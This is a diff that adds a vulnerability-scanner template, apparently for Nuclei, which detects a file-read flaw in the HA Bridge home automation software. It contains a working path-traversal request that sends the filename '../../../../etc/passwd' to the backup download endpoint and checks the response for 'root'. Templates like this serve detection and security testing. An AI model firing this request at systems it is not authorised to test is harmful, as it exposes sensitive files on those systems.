@@ -1,0 +1,29 @@
+id: ha-bridge-file-read
+
+info:
+  name: HA-Bridge File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    HA Bridge is a home automation bridge that simulates a Philips Hue light system and can control other systems such as Vera, Harmony Hub, Nest, MiLight bulbs or any other system with HTTP/HTTPS/TCP/UDP interface. This vulnerability allows attackers to read sensitive system files, such as configuration files, leading to potential data exposure.
+  tags: file-read
+
+http:
+  - raw:
+      - |
+        PUT /api/devices/backup/download HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=utf-8
+
+        {"filename":"../../../../etc/passwd"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/bin/bash"
+          - "root"
